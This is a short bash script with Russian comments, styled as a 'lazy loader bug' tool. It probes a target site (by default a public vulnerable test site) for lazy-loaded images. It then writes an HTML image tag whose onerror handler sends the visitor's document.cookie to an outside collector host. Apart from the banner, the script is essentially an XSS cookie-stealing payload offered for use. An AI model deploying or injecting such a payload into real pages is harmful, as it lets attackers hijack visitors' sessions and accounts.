#!/bin/bash
TARGET=${1:-"http://testphp.vulnweb.com"}
echo "╔══════════════════════════════════════════════╗"
echo "║   🦥 LAZY LOADER — Жучок в ленивой загрузке ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Ищем lazy loading на сайте
echo "[LAZY] 🔍 Ищу lazy loading..."
curl -sk --max-time 5 "$TARGET" -o /tmp/lazy_site.html 2>/dev/null
grep -qi "loading=\"lazy\"" /tmp/lazy_site.html 2>/dev/null && echo "  💀 Lazy loading НАЙДЕН!"

# Создаём заражённый placeholder
cat > /tmp/lazy_bug.html << LAZYHTML
<img src="legit-image.jpg"
     loading="lazy"
     onerror="fetch('https://collector.example.com/bug?id=lazy_$(date +%s)&data='+document.cookie)"
     alt="Loading...">
LAZYHTML
echo "  🐞 Заражённый placeholder: /tmp/lazy_bug.html"
echo "  Когда изображение не загрузится — сработает жучок."
echo "[LAZY] ✅ Анализ завершён"
